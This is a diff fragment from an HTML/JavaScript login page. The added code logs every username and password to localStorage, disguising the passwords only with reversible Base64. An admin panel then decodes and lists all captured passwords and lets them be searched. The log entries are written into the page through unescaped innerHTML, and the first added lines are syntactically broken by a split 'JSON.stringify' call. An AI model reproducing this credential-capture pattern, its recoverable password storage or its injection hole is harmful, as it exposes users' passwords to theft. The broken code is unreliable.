@@ -188,3 +188,65 @@
             const newLog = { username, password: btoa(password), timestamp: formattedTimestamp }; // Obfuscate password with Base64 encoding
             logs.push(newLog);
             localStorage.setItem('loginLogs', JSON.stringify
+logs));
+        }
+
+        function formatDate(date) {
+            const month = String(date.getMonth() + 1).padStart(2, '0');
+            const day = String(date.getDate()).padStart(2, '0');
+            const year = date.getFullYear();
+            const hours = String(date.getHours()).padStart(2, '0');
+            const minutes = String(date.getMinutes()).padStart(2, '0');
+            const seconds = String(date.getSeconds()).padStart(2, '0');
+            return `${month}/${day}/${year}, ${hours}:${minutes}:${seconds}`;
+        }
+
+        function showAdminPanel() {
+            document.getElementById('login-container').style.display = 'none';
+            const adminContainer = document.getElementById('admin-container');
+            adminContainer.style.display = 'block';
+            displayLogs();
+        }
+
+        function displayLogs() {
+            const logList = document.getElementById('log-list');
+            const logs = JSON.parse(localStorage.getItem('loginLogs')) || [];
+            logList.innerHTML = logs.map(log => `
+                <div class="log-item">
+                    <div>[${log.timestamp}]</div>
+                    <div>Username: ${log.username}</div>
+                    <div>Password: ${atob(log.password)}</div>
+                    <div class="log-divider"></div> <!-- Divider -->
+                </div>`).join('');
+        }
+
+        function clearLogs() {
+            localStorage.removeItem('loginLogs');
+            displayLogs();
+        }
+
+        function logout() {
+            document.getElementById('login-container').style.display = 'block';
+            document.getElementById('admin-container').style.display = 'none';
+        }
+
+        function searchLogs() {
+            const query = document.getElementById('search-bar').value.toLowerCase();
+            const logList = document.getElementById('log-list');
+            const logs = JSON.parse(localStorage.getItem('loginLogs')) || [];
+            const filteredLogs = logs.filter(log => 
+                log.username.toLowerCase().includes(query) ||
+                atob(log.password).toLowerCase().includes(query) ||
+                log.timestamp.toLowerCase().includes(query)
+            );
+            logList.innerHTML = filteredLogs.map(log => `
+                <div class="log-item">
+                    <div>[${log.timestamp}]</div>
+                    <div>Username: ${log.username}</div>
+                    <div>Password: ${atob(log.password)}</div>
+                    <div class="log-divider"></div> <!-- Divider -->
+                </div>`).join('');
+        }
+    </script>
+</body>
+</html>
